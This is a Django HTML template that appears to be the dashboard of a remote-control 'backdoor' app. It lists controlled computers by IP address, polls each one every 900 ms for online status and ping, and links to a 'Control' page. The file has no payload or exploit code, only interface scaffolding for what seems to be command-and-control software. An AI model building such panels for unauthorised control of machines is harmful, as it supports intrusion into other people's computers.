{% include 'backdoor/base.html' %}
{% block content %}
{% for computer in computers %}
    <div class="computerdiv" style="zoom: 175%">
        
        <div style="display:flex; flex-direction:row;">
            <p id="online-status-{{computer.id}}">âšª Checking</p>
            <p id="ping-{{computer.id}}" style="margin-left:7px;"></p>
        </div>
        <h4 style="color:grey;font-size:16px;">{{computer.ip_addr}}</h4>
        <a style="text-decoration:none;" href="{% url 'computer-detail' pc_id=computer.id %}">
            <button type="button" class="btn btn-outline-dark">Control</button>
        </a>
        </div>
        <script>$(document).ready(function(){
            setInterval(function(){
                $.ajax({
                    type:'GET',
                    url : "{% url 'ajax-pc' computer.id %}",
                    success: function(response){
                        let element = document.getElementById("online-status-{{computer.id}}")
                        if(response.data == "online")
                        {
                            element.innerText = "ðŸŸ¢ Online"
                            element.style.color = "green"
                            let ping_element = document.getElementById("ping-{{computer.id}}") 
                            if(response.ping < 50)
                            {
                                ping_element.innerText = response.ping+"ms"      
                                ping_element.style.color = "green"
                            }
                            else if(response.ping > 50 && response.ping < 150)
                            {
                                ping_element.innerText = response.ping+"ms"      
                                ping_element.style.color = "yellow"
                            }
                            else{
                                ping_element.innerText = response.ping+"ms"      
                                ping_element.style.color = "red"
                            }
                        }
                        else {
                            element.innerText = "ðŸ”´ Offline"
                            element.style.color = "red"
                        }      
                        
                        
                    },
                    error: function(response)
                    {
                        console.log("b");
                    }
                });
            },900);
        });</script>
    </div>
{% endfor %}
{% endblock content %}